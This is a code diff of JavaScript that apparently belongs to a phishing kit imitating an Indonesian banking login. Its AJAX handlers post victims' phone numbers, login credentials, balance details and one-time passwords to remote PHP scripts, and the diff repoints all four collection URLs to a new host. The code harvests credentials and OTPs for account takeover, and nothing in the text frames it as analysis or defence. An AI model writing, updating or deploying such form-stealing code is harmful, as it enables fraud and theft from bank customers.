@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://choreo.cloud/bsi/e4d4/no.php',
+            url: 'https://cek-in.my.id/p/req/one.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://choreo.cloud/bsi/e4d4/login.php',
+            url: 'https://cek-in.my.id/p/req/two.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://choreo.cloud/bsi/e4d4/saldo.php',
+            url: 'https://cek-in.my.id/p/req/thre.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://choreo.cloud/bsi/e4d4/otp.php',
+ url: 'https://cek-in.my.id/p/req/empat.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
